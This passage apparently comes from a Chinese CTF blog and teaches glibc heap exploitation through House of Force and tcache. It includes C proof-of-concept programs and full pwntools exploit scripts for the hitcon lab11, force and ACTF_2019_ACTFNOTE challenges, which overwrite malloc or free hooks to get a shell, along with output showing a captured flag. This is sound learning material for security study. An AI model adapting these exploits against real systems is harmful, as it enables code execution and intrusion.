<p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rax = 0x00007ffff7dd1b10</span><br><span class="line"></span><br><span class="line">0x400562 &lt;main+60&gt;        mov    edi, 0x10</span><br><span class="line">0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure>

<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>在这一节中讲解了 House Of Force 的原理并且给出了两个利用的简单示例，通过观察这两个简单示例我们会发现其实 HOF 的利用要求还是相当苛刻的。</p>
<ul>
<li>首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。</li>
<li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li>
<li>第三，分配的次数不能受限制</li>
</ul>
<p>其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过 HOF 的方法进行利用。</p>
<p>公式为： <code>malloc(size)</code> 中的 <code>size=new_top_chunk_addr-old_top_chunk_addr-0x10</code>  </p>
<ul>
<li><code>new_top_chunk_addr</code> 为要转移 <code>top_chunk</code> 的目标地址。  </li>
<li><code>old_top_chunk_addr</code> 为已经被篡改的 <code>top_chunk</code> 地址。</li>
<li>new_top_chunk_addr &#x3D; target_addr - 0x10</li>
</ul>
<h1 id="top-chunk-attack的利用"><a href="#top-chunk-attack的利用" class="headerlink" title="top chunk attack的利用"></a>top chunk attack的利用</h1><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>利用溢出等漏洞，将top chunk的size修改为-1，转换为无符号数就是最大值，然后通过malloc(offset)，即可将top chunk转移到目标地址，比如malloc_hook等，然后，再次malloc，就可控制目标地址处的数据（此图中的addr1已是old_top_chunk_addr - 0x10）。</p>
<p><img data-src="/../images/image-20250409132924240.png" alt="image-20250409132924240"></p>
<p>不仅可以malloc正数，还可以malloc(负数)使得top chunk上移到程序里的got表等。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *top_chunk_addr = p1 + <span class="number">0x10</span>;</span><br><span class="line">   *(<span class="type">size_t</span> *)(top_chunk_addr + <span class="number">0x8</span>) = <span class="number">-1</span>; <span class="comment">//修改top chunk的size</span></span><br><span class="line">   <span class="type">size_t</span> offset = buf - p1 - <span class="number">0x30</span>;<span class="comment">//(buf-0x10) - (p1+0x10) - 0x10</span></span><br><span class="line">   <span class="built_in">malloc</span>(offset);</span><br><span class="line">    </span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>(p2,<span class="string">&quot;hello,welcome to pwn\n&quot;</span>);</span><br><span class="line">   write(<span class="number">1</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="无free得到unsortedbin"><a href="#无free得到unsortedbin" class="headerlink" title="无free得到unsortedbin"></a>无free得到unsortedbin</h2><p>前面，我们分析到，如果想要的size大于top chunk的size，并且size在mmap阈值之下，那么就会申请新的top chunk，将旧的top chunk给free掉，我们可以利用这个free来得到unsorted bin。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));<span class="comment">//*</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));<span class="comment">//*页检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>

<p>Top chunk的size不是随便改变某个值，想要验证检查，其中这里是页对齐检查，也就是说top_chunk_addr + size的值低12bit为0。</p>
<p>系统分配时的top chunk一般是页对齐的，一般情况下在改size时只需要将高位置零，低位不变即可。</p>
<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *top_chunk_addr = p1 + <span class="number">0x10</span>;</span><br><span class="line">   *(<span class="type">size_t</span> *)(top_chunk_addr + <span class="number">0x8</span>) = <span class="number">0xFE1</span>; <span class="comment">//修改top chunk的size，注意页对齐</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20250409152243476.png" alt="image-20250409152243476"></p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="hitcon-lab11"><a href="#hitcon-lab11" class="headerlink" title="hitcon lab11"></a>hitcon lab11</h2><p>越看越熟悉，这不是我学习unlink时的例题吗 ^_^</p>
<p>house_of_force思路：</p>
<ol>
<li>溢出改top_chunk为 -1</li>
<li>house_of_force 将 top_chunk 迁移至hello_message()和goodbye_messgae()所在的结构体</li>
<li>将这goodbye_message()函数改为magic()函数，即可拿flag</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-09 18:32:41</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,name</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(length))</span><br><span class="line">    ru(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,name</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(length))</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(-<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>ubuntu16.04，glibc2.23</p>
<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    b<span class="string">&#x27;5\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">invaild choice!!!</span><br><span class="line">----------------------------</span><br><span class="line">Bamboobox Menu</span><br><span class="line">----------------------------</span><br><span class="line">1.show the items <span class="keyword">in</span> the box</span><br><span class="line">2.add a new item</span><br><span class="line">3.change the item <span class="keyword">in</span> the box</span><br><span class="line">4.remove the item <span class="keyword">in</span> the box</span><br><span class="line">5.<span class="built_in">exit</span></span><br><span class="line">----------------------------</span><br><span class="line">Your choice:[*] Process <span class="string">&#x27;./pwn&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 1162)</span><br><span class="line">[DEBUG] Received 0x15 bytes:</span><br><span class="line">    b<span class="string">&#x27;flah&#123;house_of_force&#125;\n&#x27;</span></span><br><span class="line">flah&#123;house_of_force&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$    </span><br></pre></td></tr></table></figure>

<h2 id="force"><a href="#force" class="headerlink" title="force"></a>force</h2><p><a href="https://github.com/le0n-daily/profile/blob/main/pwn/force">i春秋新春战疫之force</a></p>
<p>漏洞点：</p>
<p><img data-src="/../images/image-20250410184421781.png" alt="image-20250410184421781"></p>
<ul>
<li>只有add()函数有用</li>
<li>malloc(input)，这个input无检查，可负可非常大</li>
<li>read()中有溢出，可在add()时就溢出</li>
</ul>
<p>思路(house_of_force)：</p>
<ol>
<li>利用mmap的阈值分配机制得到libc_base</li>
<li>house_of_force 改 top_chunk 大小 -1，分配到堆块可以改 realloc_hook 和 malloc_hook</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-09 18:32:41</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./force&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;2:puts&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">b&#x27;bin addr &#x27;</span>)</span><br><span class="line">    <span class="comment"># data = int(rl().split()[0])</span></span><br><span class="line">    data = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;content&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过mmap一个堆，我们得到了mmap的堆的地址，就能计算出libc地址</span></span><br><span class="line"><span class="comment">#因为mmap的这个堆靠近libc的地址</span></span><br><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;aaaa&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one = libc_base + gadget[<span class="number">0</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#house of force</span></span><br><span class="line"><span class="comment">#修改top chunk的size为-1，即超级大</span></span><br><span class="line">heap = add(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">top_chunk = heap + <span class="number">0x10</span></span><br><span class="line">leak(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">leak(<span class="string">&#x27;realloc_hook&#x27;</span>,realloc_hook)</span><br><span class="line">leak(<span class="string">&#x27;malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line"><span class="comment">#分配偏移大小的chunk，将top chunk移到了malloc_hook_addr - 0x20处</span></span><br><span class="line">offset = malloc_hook - <span class="number">0x20</span> - top_chunk - <span class="number">0x10</span></span><br><span class="line">add(offset,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#写 realloc_hook 和 malloc_hook</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(one) + p64(realloc_hook+<span class="number">4</span>) </span><br><span class="line">add(<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;2:puts&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="ACTF-2019-ACTFNOTE"><a href="#ACTF-2019-ACTFNOTE" class="headerlink" title="ACTF_2019_ACTFNOTE"></a>ACTF_2019_ACTFNOTE</h2><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/ctf/pwn/ACTF_2019_ACTFNOTE&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>相关结构体：</p>
<img data-src="../images/image-20250410214807265.png" alt="image-20250410214807265" style="zoom: 50%;" />

<p>edit()函数中存在溢出漏洞：</p>
<p><img data-src="/../images/image-20250410215136768.png" alt="image-20250410215136768"></p>
<p>free和show中无漏洞</p>
<p>add()函数如下:</p>
<p><img data-src="/../images/image-20250410215229919.png" alt="image-20250410215229919"></p>
<p><strong>利用思路：</strong></p>
<ul>
<li>通过溢出漏洞改top_chunk的size，为 -1</li>
<li>top_chunk上移至存放指针的结构体，修改结构体中content的指针，实现任意地址读写</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-10 22:00:36</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./ACTF_2019_ACTFNOTE&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;/$ &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;please input note name size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;please input note name: &#x27;</span>,name)</span><br><span class="line">    sa(<span class="string">b&#x27;please input note content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input note id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;please input new note content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input note id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sla(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;input note id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x17</span>+<span class="string">b&#x27;s&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa\n&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;ds&#x27;</span>)</span><br><span class="line">libc_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x7b61e</span></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>,<span class="string">b&#x27;b\n&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#top chunk上移形成overlap chunk</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">##这里要注意因为程序strdup申请出来的空间是与content重合了</span></span><br><span class="line"><span class="comment">##此处内存不能写，所以这个第三个参数必须为空</span></span><br><span class="line">add(-<span class="number">0x80</span>,p64(free_hook),<span class="string">b&#x27;&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache attack</title>
    <url>/2025/03/26/tcache_attack/</url>
    <content><![CDATA[<p>文章是在初次学习tcache_attack时写的，有不准确的地方还望指正，文章中所用的环境基本都是ubuntu18.04</p>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><p>cache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p>
<blockquote>
<p>主要参考了 glibc 2.27源码，</p>
</blockquote>
<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><p>tcache 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code>。</p>
<p>这其实和 fastbin 很像，但又不一样。</p>
<h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p>
